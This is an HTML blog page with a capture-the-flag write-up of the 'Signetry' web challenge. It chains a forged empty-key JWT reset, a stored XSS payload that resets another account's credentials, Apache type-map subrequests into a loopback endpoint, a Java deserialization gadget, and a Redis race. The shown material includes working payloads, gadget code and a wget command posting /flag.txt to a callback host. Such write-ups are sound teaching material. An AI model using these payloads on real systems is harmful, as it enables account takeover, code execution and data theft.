@@ -1,0 +1,966 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Signetry | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="I chained a forgeable password-reset token, stored client-side execution, Apache type-map subrequests, a privileged review bot, Java deserialization, and a finalize-withdraw race to reach code execution in the model registry.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/signetry.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<meta property="og:url" content="https://jennshaggy.github.io/signetry.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Signetry">
+<meta property="og:description" content="I chained a forgeable password-reset token, stored client-side execution, Apache type-map subrequests, a privileged review bot, Java deserialization, and a finalize-withdraw race to reach code execution in the model registry.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Signetry">
+<meta name="twitter:description" content="I chained a forgeable password-reset token, stored client-side execution, Apache type-map subrequests, a privileged review bot, Java deserialization, and a finalize-withdraw race to reach code execution in the model registry.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu">
+                    <span class="menu-toggle-label">Menu</span>
+                    <span class="menu-toggle-icon" aria-hidden="true">
+                        <span></span>
+                        <span></span>
+                    </span>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Signetry</h1>
+    <div class="post-description">I chained a forgeable password-reset token, stored client-side execution, Apache type-map subrequests, a privileged review bot, Java deserialization, and a finalize-withdraw race to reach code execution in the model registry.</div>
+  </header>
+
+  <div class="post-content">
+
+<table>
+<tbody>
+<tr><th>Event</th><td>Hack The Box Cyber Apocalypse 2026</td></tr>
+<tr><th>Category</th><td>Web</td></tr>
+<tr><th>Difficulty</th><td>Hard</td></tr>
+<tr><th>Points</th><td>975</td></tr>
+<tr><th>Outcome</th><td>Solved</td></tr>
+</tbody>
+</table>
+
+<img src="/images/signetry/Screenshot 2026-07-26 at 9.20.03 PM.png" alt="Signetry challenge overview on Hack The Box" style="max-width:100%;margin:2rem 0;">
+
+<p>First world problems, I guess?</p>
+
+<hr>
+
+<h2>The assignment</h2>
+
+<p>The challenge asked me to change a corrupted oath before it turned Sir Garran Voss against the soldiers beside him.</p>
+
+<p>The supplied files contained an Apache frontend, a Go application, a Headless Chrome review bot, Redis-backed model staging, and a Java/DL4J model registry. The flag lived inside the Java container. Reaching it required several privilege and trust-boundary crossings.</p>
+
+<hr>
+
+<h2>Reading the system before touching it</h2>
+
+<p>I started in the source. There were too many moving parts to treat the application as one target, so I mapped the boundaries first.</p>
+
+<h3>The password-reset token</h3>
+
+<pre><code>nl -ba crownspire/internal/auth/authenticator.go |
+sed -n '38,70p;150,165p'</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 2.52.02 PM.png" alt="Go authenticator showing empty HMAC key and reset handler trusting JWT jti" style="max-width:100%;margin:2rem 0;">
+
+<p>QOR was initialized without an assigned signing secret. The reset handler also trusted <code>claims.Id</code>, populated from the JWT <code>jti</code>, as the account to modify. A valid token naming <code>dms@htb.com</code> could reset the maintainer account.</p>
+
+<h3>The privilege ladder</h3>
+
+<pre><code>nl -ba crownspire/internal/handler/handler.go |
+sed -n '42,75p'</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 4.08.33 PM.png" alt="Go route groups showing role-gated endpoints" style="max-width:100%;margin:2rem 0;">
+
+<p>The route groups established the path I would need to follow:</p>
+
+<table>
+<thead>
+<tr><th>Role or context</th><th>Capability</th></tr>
+</thead>
+<tbody>
+<tr><td>Anonymous</td><td>Authenticate and query identity.</td></tr>
+<tr><td>Maintainer</td><td>Stage and withdraw models, submit appeals, and upload attachments.</td></tr>
+<tr><td>Warden</td><td>Review appeals and reissue credentials.</td></tr>
+<tr><td>Curator</td><td>Finalize staged models.</td></tr>
+<tr><td>Loopback request</td><td>Dispatch the Warden.</td></tr>
+</tbody>
+</table>
+
+<h3>Apache and the upload directory</h3>
+
+<pre><code>nl -ba apache/signetry.conf |
+sed -n '25,46p'</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 5.39.40 PM.png" alt="Apache configuration showing uploads alias and MultiViews with subrequest exemption" style="max-width:100%;margin:2rem 0;">
+
+<p>Apache served <code>/uploads</code> from the writable attachment directory, treated <code>.var</code> files as type maps, and enabled <code>MultiViews</code>. Everything else was proxied to Crownspire on loopback. Ordinary external requests to <code>/internal</code> were blocked, but the restriction exempted subrequests.</p>
+
+<p>That configuration made an uploaded type map worth investigating.</p>
+
+<h3>The Warden</h3>
+
+<pre><code>nl -ba crownspire/cmd/wardenbot/main.go |
+sed -n '27,68p;119,143p'</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 5.45.00 PM.png" alt="Warden bot authenticating and placing session into Chromium" style="max-width:100%;margin:2rem 0;">
+<img src="/images/signetry/Screenshot 2026-07-27 at 5.45.26 PM.png" alt="Warden bot visiting queued paths under Crownspire origin" style="max-width:100%;margin:2rem 0;">
+
+<p>The Warden authenticated as <code>warden@htb.com</code>, placed its <code>HttpOnly</code> session into Chromium, and visited queued paths under the Crownspire origin. If I could make it open a stored appeal, the browser would carry the service account's authority with it.</p>
+
+<h3>The appeal renderer</h3>
+
+<pre><code>nl -ba crownspire/frontend/src/pages/MemoryBank.jsx |
+sed -n '1,16p;157,159p;569,576p'</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 5.47.58 PM.png" alt="React appeal renderer with html-react-parser and incomplete blocklist" style="max-width:100%;margin:2rem 0;">
+
+<p>Appeal bodies passed through <code>html-react-parser</code> after an incomplete blocklist. The ingredients were present, but I still needed to prove every transition.</p>
+
+<p>Time to dive in!</p>
+
+<hr>
+
+<h2>Resetting the maintainer account</h2>
+
+<p>I confirmed the public baseline first:</p>
+
+<pre><code>curl -sS -i "$TARGET/api/whoami" |
+sed -n '1,25p'</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 6.01.19 PM.png" alt="whoami endpoint returning anonymous role" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>{"role":"anonymous","sub":"anonymous"}</code></pre>
+
+<p>The endpoint was public, the role was anonymous, and Apache was fronting the Go application.</p>
+
+<p>I generated an HS256 reset token with the maintainer identity in <code>jti</code>. The application used an empty HMAC key, so the signing operation reduced to:</p>
+
+<pre><code>message = encoded_header + b"." + encoded_payload
+signature = b64url(
+    hmac.new(b"", message, hashlib.sha256).digest()
+)</code></pre>
+
+<p>The full token is omitted. I submitted it with a temporary challenge password:</p>
+
+<pre><code>jq -nc \
+  --arg token "$RESET_TOKEN" \
+  --arg password '[REDACTED]' \
+  '{reset_password_token:$token,new_password:$password}' |
+curl --max-time 10 -sS -i \
+  -X POST "$TARGET/auth/password/update" \
+  -H 'Content-Type: application/json' \
+  --data-binary @-</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 6.04.02 PM.png" alt="Password reset accepted for dms@htb.com" style="max-width:100%;margin:2rem 0;">
+
+<p>The server accepted the reset for <code>dms@htb.com</code>.</p>
+
+<p>Excellent. The forged empty-key JWT reset the maintainer account.</p>
+
+<p>I logged in, saved the <code>HttpOnly</code> session to a cookie jar, and checked it:</p>
+
+<pre><code>jq -nc \
+  --arg login 'dms@htb.com' \
+  --arg password '[REDACTED]' \
+  '{login:$login,password:$password}' |
+curl --max-time 10 -sS \
+  -c /tmp/signetry-maint.cookies \
+  -X POST "$TARGET/api/login" \
+  -H 'Content-Type: application/json' \
+  --data-binary @- |
+jq .
+
+curl --max-time 10 -sS \
+  -b /tmp/signetry-maint.cookies \
+  "$TARGET/api/whoami" |
+jq .</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 8.05.57 PM.png" alt="Login and whoami confirming maintainer role" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>{
+  "role": "maintainer",
+  "sub": "dms@htb.com"
+}</code></pre>
+
+<p>Maintainer access confirmed.</p>
+
+<hr>
+
+<h2>Building the stored appeal</h2>
+
+<p>The maintainer could submit appeals and upload attachments, but could not finalize models. That authority belonged to the curator.</p>
+
+<p>I reproduced the application's React and <code>html-react-parser</code> versions locally and rendered several test payloads. React discarded string event handlers on standard elements, but preserved one on a custom HTML element. A short CSS animation could invoke it without a click.</p>
+
+<p>Let's tango.</p>
+
+<p>The stored appeal followed this structure:</p>
+
+<pre><code>&lt;x-signetry
+  style="display:block;animation:oath 1ms"
+  onanimationstart="fetch(
+    '/admin/credential/reset',
+    {/* request body redacted */}
+  )"&gt;
+&lt;/x-signetry&gt;
+&lt;style&gt;
+  @keyframes oath {
+    from { opacity:.99 }
+    to { opacity:1 }
+  }
+&lt;/style&gt;</code></pre>
+
+<p>The handler reset <code>conservator@htb.com</code> to a temporary challenge password. I submitted the appeal with the maintainer session:</p>
+
+<pre><code>jq -nc --arg body "$APPEAL" '{body:$body}' |
+curl --max-time 10 -sS \
+  -b /tmp/signetry-maint.cookies \
+  -X POST "$TARGET/api/appeals" \
+  -H 'Content-Type: application/json' \
+  --data-binary @- |
+jq .</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 8.22.43 PM.png" alt="Appeal stored and submitted for review" style="max-width:100%;margin:2rem 0;">
+
+<p>The appeal was stored and submitted for review.</p>
+
+<p>We are not summoning the Warden quite yet.</p>
+
+<hr>
+
+<h2>Learning Apache's type-map syntax</h2>
+
+<p>I first uploaded a <code>.var</code> file that pointed at <code>/internal/dispatch</code>. Requesting it returned <code>404</code>.</p>
+
+<p>Nope. This one also gave us friction.</p>
+
+<p>I switched to a harmless control. If the API and Apache shared the same upload directory, a plain text file should survive the round trip:</p>
+
+<pre><code>printf 'attachment-visible\n' &gt; visibility.txt
+
+curl --max-time 10 -sS \
+  -b /tmp/signetry-maint.cookies \
+  -X POST "$TARGET/api/attachments?name=visibility.txt" \
+  --data-binary @visibility.txt |
+jq .
+
+curl --max-time 10 -sS -i \
+  "$TARGET/uploads/visibility.txt"</code></pre>
+
+<p>The upload initially returned <code>sign in required</code>. The maintainer session had expired, which explained part of the apparent routing failure. I renewed the cookie and repeated the control.</p>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 9.08.43 PM.png" alt="Attachment upload and retrieval confirming shared directory" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>HTTP/1.1 200 OK
+Content-Type: text/plain
+
+attachment-visible</code></pre>
+
+<p>Score. Attachment is visible.</p>
+
+<p>The API and Apache shared the same writable directory. I could now test the map parser without confusing authentication and routing failures.</p>
+
+<p>Apache type maps use blank-line-separated stanzas. The first names the represented resource; the second describes a selectable variant. As someone who learned to read music as a child, I appreciate that they are called stanzas.</p>
+
+<p>I pointed a two-stanza map at the control file:</p>
+
+<pre><code>printf '%s\n' \
+  'URI: localprobe' \
+  '' \
+  'URI: visibility.txt' \
+  'Content-Type: text/plain' \
+  '' &gt; localprobe.var
+
+curl --max-time 10 -sS \
+  -b /tmp/signetry-maint.cookies \
+  -X POST "$TARGET/api/attachments?name=localprobe.var" \
+  --data-binary @localprobe.var |
+jq .
+
+curl --max-time 10 -sS -i \
+  -H 'Accept: text/plain' \
+  "$TARGET/uploads/localprobe.var"</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 10.13.29 PM.png" alt="Apache parsing type map and serving visibility.txt through content negotiation" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>Content-Location: visibility.txt
+Vary: negotiate
+TCN: choice
+Content-Type: text/plain
+
+attachment-visible</code></pre>
+
+<p>Wooo! Apache parsed the map, selected <code>visibility.txt</code>, and served it.</p>
+
+<hr>
+
+<h2>Crossing the upload boundary</h2>
+
+<p>Root-relative and explicit proxy variants still returned <code>404</code>. Those failures suggested that Apache was resolving the selected URI inside the upload alias.</p>
+
+<p>I changed the variant to a relative path:</p>
+
+<pre><code>printf '%s\n' \
+  'URI: relativeprobe' \
+  '' \
+  'URI: ../api/whoami' \
+  'Content-Type: application/json' \
+  '' &gt; relativeprobe.var
+
+curl --max-time 10 -sS \
+  -b /tmp/signetry-maint.cookies \
+  -X POST "$TARGET/api/attachments?name=relativeprobe.var" \
+  --data-binary @relativeprobe.var |
+jq .
+
+curl --max-time 10 -sS -i \
+  -H 'Accept: application/json' \
+  "$TARGET/uploads/relativeprobe.var"</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 10.55.21 PM.png" alt="Relative path type map resolving whoami through Apache subrequest" style="max-width:100%;margin:2rem 0;">
+
+<p>Apache returned the Go application's identity response:</p>
+
+<pre><code>{"role":"anonymous","sub":"anonymous"}</code></pre>
+
+<p>The uploaded map had resolved <code>../api/whoami</code> outside <code>/uploads</code> and routed the subrequest into Crownspire. That was the primitive I needed.</p>
+
+<hr>
+
+<h2>Summoning the Warden</h2>
+
+<p>I aimed the same relative variant at the loopback-only dispatcher:</p>
+
+<pre><code>printf '%s\n' \
+  'URI: callthewarden' \
+  '' \
+  'URI: ../internal/dispatch' \
+  'Content-Type: application/json' \
+  '' &gt; callthewarden.var
+
+curl --max-time 10 -sS \
+  -b /tmp/signetry-maint.cookies \
+  -X POST "$TARGET/api/attachments?name=callthewarden.var" \
+  --data-binary @callthewarden.var |
+jq .</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 10.57.28 PM.png" alt="callthewarden.var uploaded successfully" style="max-width:100%;margin:2rem 0;">
+
+<p>Take a deep breath. Time to cross the Apache trust boundary and summon the Warden.</p>
+
+<pre><code>curl --max-time 10 -sS -i \
+  -H 'Accept: application/json' \
+  "$TARGET/uploads/callthewarden.var"</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 10.58.27 PM.png" alt="Warden dispatch returning 202 Accepted queued for review" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>HTTP/1.1 202 Accepted
+Content-Type: application/json; charset=utf-8
+
+{"status":"queued for review"}</code></pre>
+
+<p>We have ourselves a pivot.</p>
+
+<p>Apache resolved the uploaded type map into <code>/internal/dispatch</code>. The dispatcher queued the Warden's authenticated <code>/admin</code> visit. The stored appeal rendered, the CSS animation fired, and the preserved handler submitted the credential-reset request.</p>
+
+<p>I tested the result by logging in as the conservator, then checked the role:</p>
+
+<pre><code>jq -nc \
+  --arg login 'conservator@htb.com' \
+  --arg password '[REDACTED]' \
+  '{login:$login,password:$password}' |
+curl --max-time 10 -sS \
+  -c /tmp/signetry-conservator.cookies \
+  -X POST "$TARGET/api/login" \
+  -H 'Content-Type: application/json' \
+  --data-binary @- |
+jq .
+
+curl --max-time 10 -sS \
+  -b /tmp/signetry-conservator.cookies \
+  "$TARGET/api/whoami" |
+jq .</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-27 at 11.02.11 PM copy.png" alt="Conservator login confirming curator role after Warden review" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>{
+  "role": "curator",
+  "sub": "conservator@htb.com"
+}</code></pre>
+
+<p>Promotion confirmed.</p>
+
+<p>I now controlled both roles needed for the model workflow. The maintainer could stage and withdraw models. The curator could finalize them.</p>
+
+<hr>
+
+<h2>Mapping the model registry</h2>
+
+<p>The final path moved into Redis and Java. I traced the stage, withdraw, and finalize handlers before building anything.</p>
+
+<p>The Go service stored three keys for each staged model:</p>
+
+<pre><code>model:blob:&lt;token&gt;
+model:unsealed:&lt;token&gt;
+model:intake:&lt;token&gt;</code></pre>
+
+<p><code>Finalize()</code> read the model blob into a local byte slice before checking the marker keys. <code>Withdraw()</code> requested deletion of the blob and both markers. Because those operations spanned several Redis keys without a transaction, their order created a narrow race:</p>
+
+<pre><code>Curator /finalize                    Maintainer /withdraw
+------------------                   --------------------
+Read the model blob.
+                                      Delete the blob.
+                                      Delete the unsealed marker.
+                                      Delete the intake marker.
+Check the remaining state.
+Send the retained bytes to Java.</code></pre>
+
+<p>If finalization read the blob before withdrawal changed the Redis state, it could retain the bytes locally, observe the markers after deletion, and submit the unreviewed model to Java.</p>
+
+<p>The normal maintainer sealing path accepted only <code>configuration.json</code> and <code>coefficients.bin</code>. An archive containing <code>preprocessor.bin</code> produced an unexpected-artifact finding and failed review. A separate internal-attestation path could clear the markers, but its randomly generated value was unavailable through the demonstrated chain. The finalize-withdraw race allowed the staged model to pass the marker check without review.</p>
+
+<p>The Java registry validated the submitted ZIP, returned <code>202</code> after queueing it, and restored the model asynchronously with:</p>
+
+<pre><code>ModelSerializer.restoreMultiLayerNetwork(model.toFile(), false);</code></pre>
+
+<p>A serialized <code>preprocessor.bin</code> supplied the deserialization sink.</p>
+
+<hr>
+
+<h2>Recreating the baseline model</h2>
+
+<p>I built the supplied Maven project and recreated the registry's reference model locally. The resulting archive established the minimum valid structure:</p>
+
+<pre><code>configuration.json
+coefficients.bin</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-31 at 11.37.03 AM.png" alt="Maven build and reference model structure" style="max-width:100%;margin:2rem 0;">
+
+<p>I generated the runtime classpath and searched the resolved JARs. Common Commons Collections gadget classes were absent. The target did contain shaded Jackson classes:</p>
+
+<pre><code>org/nd4j/shade/jackson/databind/node/POJONode.class
+org/nd4j/shade/jackson/databind/node/BaseJsonNode.class</code></pre>
+
+<p>I also confirmed that my ysoserial JAR contained its <code>Gadgets</code> helper and Javassist:</p>
+
+<pre><code>jar tf ~/Downloads/ysoserial-all.jar |
+grep -E \
+  '^(ysoserial/payloads/util/Gadgets|javassist/ClassPool)\.class$'</code></pre>
+
+<p>The candidate sink was:</p>
+
+<p><code>POJONode.toString()</code> &rarr; Shaded Jackson serialization &rarr; <code>TemplatesImpl.getOutputProperties()</code> &rarr; Malicious translet initialization.</p>
+
+<hr>
+
+<h2>Developing the Java trigger</h2>
+
+<p>My first trigger used a <code>Hashtable</code> hash collision between <code>XString</code> and <code>POJONode</code>. It serialized, and <code>strings</code> confirmed that the intended objects were present:</p>
+
+<pre><code>strings -a preprocessor-test.bin |
+grep -E \
+  'POJONode|TemplatesImpl|XString|Hashtable'</code></pre>
+
+<pre><code>java.util.Hashtable
+org.nd4j.shade.jackson.databind.node.POJONode
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
+com.sun.org.apache.xpath.internal.objects.XString</code></pre>
+
+<p>Initial local reads did not create <code>/tmp/oathforger-proof</code>. After opening the required Java modules, the proof file appeared before a later Jackson exception. The side effect mattered more than the post-execution stack trace: <code>POJONode</code> to <code>TemplatesImpl</code> had reached the command sink.</p>
+
+<p>The Hashtable trigger remained awkward, so I inspected the target's Java 11 implementation of <code>BadAttributeValueExpException</code>:</p>
+
+<pre><code>sudo docker run --rm eclipse-temurin:11-jdk \
+  javap -private \
+  javax.management.BadAttributeValueExpException
+
+sudo docker run --rm eclipse-temurin:11-jdk \
+  javap -c -private \
+  javax.management.BadAttributeValueExpException |
+sed -n '/readObject(/,/^}/p'</code></pre>
+
+<p>The class retained an <code>Object val</code> field. Its Java 11 <code>readObject()</code> implementation called <code>toString()</code> on the deserialized value when no Security Manager prevented that path. The challenge started the registry with ordinary <code>java -jar</code>, with no Security Manager configuration in the entrypoint.</p>
+
+<p>I replaced the Hashtable collision with a <code>BadAttributeValueExpException</code> containing the shaded Jackson node:</p>
+
+<pre><code>Object templates = Gadgets.createTemplatesImpl(args[0]);
+POJONode node = new POJONode(templates);
+
+BadAttributeValueExpException trigger =
+    new BadAttributeValueExpException(null);
+
+Field valField =
+    BadAttributeValueExpException.class.getDeclaredField("val");
+valField.setAccessible(true);
+valField.set(trigger, node);</code></pre>
+
+<p><code>OathForger.java</code> also removed <code>BaseJsonNode.writeReplace()</code> with Javassist so the <code>POJONode</code> survived serialization.</p>
+
+<p>The final gadget builder is available from the site's <a href="/scripts/">Scripts page</a> as <a href="/scripts/OathForger.java"><code>OathForger.java</code></a>.</p>
+
+<p>I validated the result inside an Eclipse Temurin 11 container. <code>VerifyOath.java</code> deleted any old proof file, deserialized the payload, reported the expected later exception, and checked for the command's side effect.</p>
+
+<img src="/images/signetry/Screenshot 2026-07-28 at 12.58.05 AM.png" alt="Java 11 verification showing sink_executed=true" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>post_execution_exception=RuntimeException
+sink_executed=true</code></pre>
+
+<p>Java deserialization reached <code>POJONode.toString()</code>, Jackson inspected the wrapped <code>TemplatesImpl</code>, and the embedded command executed before the later exception.</p>
+
+<p>The Java 11 verification harness is available from the site's <a href="/scripts/">Scripts page</a> as <a href="/scripts/VerifyOath.java"><code>VerifyOath.java</code></a>.</p>
+
+<hr>
+
+<h2>Packaging the live model</h2>
+
+<p>The target Dockerfile installed <code>wget</code>, so I used it to POST <code>/flag.txt</code> to a controlled callback. The callback identifier is redacted.</p>
+
+<p>I generated the final serialized payload under Java 11:</p>
+
+<pre><code>sudo docker run --rm \
+  -v /home/jenn:/home/jenn \
+  -v /tmp/signetry-classpath.txt:/tmp/signetry-classpath.txt:ro \
+  -w "$PWD" \
+  eclipse-temurin:11-jdk sh -lc '
+    CP=".:$(cat /tmp/signetry-classpath.txt):/home/jenn/Downloads/ysoserial-all.jar"
+
+    java \
+      --add-opens java.base/java.lang=ALL-UNNAMED \
+      --add-opens java.management/javax.management=ALL-UNNAMED \
+      --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+      --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED \
+      --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+      -cp "$CP" OathForger \
+      "wget -q --post-file=/flag.txt -O /dev/null [REDACTED_CALLBACK]" \
+      preprocessor.bin
+  '</code></pre>
+
+<p>I combined <code>preprocessor.bin</code> with the unmodified files from the reference model:</p>
+
+<pre><code>from zipfile import ZIP_DEFLATED, ZipFile
+
+with ZipFile("reference-model.zip") as source:
+    with ZipFile("oathbound-model.zip", "w", ZIP_DEFLATED) as output:
+        for name in ("configuration.json", "coefficients.bin"):
+            output.writestr(name, source.read(name))
+        output.write("preprocessor.bin", "preprocessor.bin")
+
+print("created=oathbound-model.zip")</code></pre>
+
+<pre><code>zipinfo -1 oathbound-model.zip
+sha256sum oathbound-model.zip</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-28 at 1.08.21 AM.png" alt="Model archive contents and SHA-256 digest" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>configuration.json
+coefficients.bin
+preprocessor.bin</code></pre>
+
+<p>The archive was ready.</p>
+
+<hr>
+
+<h2>Restoring the chain after a respawn</h2>
+
+<p>The live instance changed before the final attempt. The old target, reset token, and sessions were gone. I repeated only the transitions the new instance required:</p>
+
+<ol>
+<li>Forge a fresh maintainer reset token.</li>
+<li>Reset and authenticate <code>dms@htb.com</code>.</li>
+<li>Resubmit the prepared appeal.</li>
+<li>Upload and request <code>callthewarden.var</code>.</li>
+<li>Authenticate as the reset conservator.</li>
+<li>Verify the <code>curator</code> role.</li>
+</ol>
+
+<img src="/images/signetry/Screenshot 2026-07-28 at 1.13.25 AM.png" alt="Respawn chain restoration steps 1 through 3" style="max-width:100%;margin:2rem 0;">
+<img src="/images/signetry/Screenshot 2026-07-28 at 1.14.53 AM.png" alt="Respawn chain restoration steps 4 through 5" style="max-width:100%;margin:2rem 0;">
+<img src="/images/signetry/Screenshot 2026-07-28 at 1.16.02 AM copy.png" alt="Curator role verified on respawned instance" style="max-width:100%;margin:2rem 0;">
+
+<p>With both roles restored, I staged the malicious model as the maintainer and captured its short-lived token:</p>
+
+<pre><code>STAGE_JSON=$(
+  curl --max-time 10 -sS \
+    -b /tmp/signetry-maint.cookies \
+    -X POST "$TARGET/stage" \
+    -H 'Content-Type: application/zip' \
+    --data-binary @oathbound-model.zip
+)
+
+printf '%s\n' "$STAGE_JSON" | jq .
+
+MODEL_TOKEN=$(
+  printf '%s\n' "$STAGE_JSON" |
+  jq -r '.token'
+)</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-28 at 1.17.09 AM copy.png" alt="Model staged with redacted token" style="max-width:100%;margin:2rem 0;">
+
+<p>The token is redacted.</p>
+
+<hr>
+
+<h2>Racing finalization against withdrawal</h2>
+
+<p>I wrote <a href="/scripts/race_the_oath.py"><code>race_the_oath.py</code></a> to load the maintainer and curator cookie jars, verify both roles, warm persistent HTTP connections, stage a fresh copy of the model for each attempt, and send <code>/finalize</code> and <code>/withdraw</code> from separate threads. The complete harness is also available from the site's <a href="/scripts/">Scripts page</a>.</p>
+
+<p>The script tested a short series of delays between the two requests. A useful result required finalization to retain the model while withdrawal changed its server-side state.</p>
+
+<pre><code>python3 race_the_oath.py "$TARGET"</code></pre>
+
+<img src="/images/signetry/Screenshot 2026-07-28 at 1.22.32 AM copy.png" alt="Race harness output showing finalize=202 withdraw=200 on attempt 1" style="max-width:100%;margin:2rem 0;">
+
+<p>The first recorded attempt landed:</p>
+
+<pre><code>maintainer=maintainer
+curator=curator
+attempt=001 delay=0.0000 finalize=202 withdraw=200
+candidate_hit=202
+response={"id":"[REDACTED]","status":"accepted","preview":"queued"}</code></pre>
+
+<p>Pwned on race attempt one!</p>
+
